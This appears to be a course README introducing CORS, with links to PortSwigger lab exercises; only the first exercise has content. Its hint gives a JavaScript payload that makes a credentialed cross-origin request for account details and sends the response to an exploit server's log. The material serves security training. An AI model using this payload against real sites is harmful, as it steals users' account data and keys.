# Cross-Origin-Resource-Sharing
Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.

## Getting Started
PortSwigger account is required [PortSwigger](https://portswigger.net/users/register)  
Necessary tools: [Burt Suite](https://portswigger.net/burp/communitydownload)

## Exercise 1
CORS vulnerability with basic origin reflection
> [Zadanie_1](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

<details>
  <summary>Hint</summary>
    
    #This code my help you accessing logs  
    #In your browser, go to the exploit server and enter the following HTML, replacing $url with your unique lab URL
  
    <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','$url/accountDetails',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
          location='/log?key='+this.responseText;
      };
    </script>
  
</details>

## Exercise 2


## Exercise 3
